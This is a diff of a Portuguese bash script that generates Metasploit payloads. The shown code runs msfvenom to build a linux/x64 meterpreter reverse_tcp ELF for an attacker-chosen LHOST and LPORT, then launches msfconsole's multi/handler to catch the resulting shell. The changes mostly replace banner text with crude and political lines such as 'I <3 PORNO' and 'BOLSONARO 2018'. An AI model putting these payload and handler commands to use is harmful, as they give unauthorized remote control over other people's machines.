@@ -1,6 +1,6 @@
 #!/bin/bash
 # ------------------------------------------------------------------------
-# ESTA FERRAMENTA ELA PERMITE GERAR UM PAYLOAD AUTOMATIZADO              *
+#              *  I <3 PORNO
 #                    CREATE BY : GHOST SAD                                   *
 #-------------------------------------------------------------------------
 # CORES
@@ -83,6 +83,7 @@ clear
 
 
 figlet         OPTIONS
+echo -e "${RED}UPGRADED 26/10/2018"
 echo -e "${WHITE}       CRIADOR DE PAYLOAD(ESCOLHA POR NUMERO) "
 echo -e "${RED}[-]OPCAO 4  NAO ESTA FUCIONANDO NO MOMENTO[-]"
 echo -e "${RED}   _________________________________________             "
@@ -231,6 +232,7 @@ clear
 echo -e "${CLARO}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
 echo "[+]OBRIGADO POR USAR ESTA FERRAMENTA [+] "
 echo "            PAYLOADS SALVO EM ARQUIVOS"
+echo "            BOLSONARO 2018                            "
 echo "           ABRINDO O METASPLOIT...  "
 echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
 msfconsole -q -x "use multi/handler ; set PAYLOAD $PAYLOAD ; set LHOST $lhost ; set LPORT $lport ; exploit" 
@@ -261,7 +263,7 @@ echo -e " ┌─["${RED}"SAD]──[${RED}~]─["$CYAN"menu]:"
 echo "CRIANDO PAYLOAD, AGUARDE.." ; msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf  > bin  2>/dev/null
 
 fi
-echo "ARQUIVO CRIADO COM SUCESSO. DESEJA CONFIGURAR O HANDLER OU IR SAIR? n\y" && read hand
+echo "ARQUIVO CRIADO COM SUCESSO. DESEJA ENTRAR NO METASPLOIT? n\y" && read hand
 clear
 if [ $hand == "y" ]
 then
